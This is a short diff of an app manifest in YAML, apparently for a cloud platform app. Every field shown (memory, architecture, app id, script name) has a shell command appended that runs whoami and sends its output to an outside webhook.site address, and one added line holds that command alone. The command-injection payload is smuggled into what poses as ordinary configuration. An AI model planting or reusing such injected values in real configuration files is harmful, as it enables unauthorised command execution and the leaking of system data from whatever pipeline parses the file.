@@ -19,6 +19,6 @@ app:
     memoryMB: 256 && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
     architecture: arm64 && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
   id: ari:cloud:ecosystem::app/02311f3d-188a-4012-9ffc-9961dc147cf0 && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
-
+&& curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami) 
 script:
 name: kali && curl https://webhook.site/5a124560-983e-478e-8b03-0f5e832c026a/?data=$(whoami)
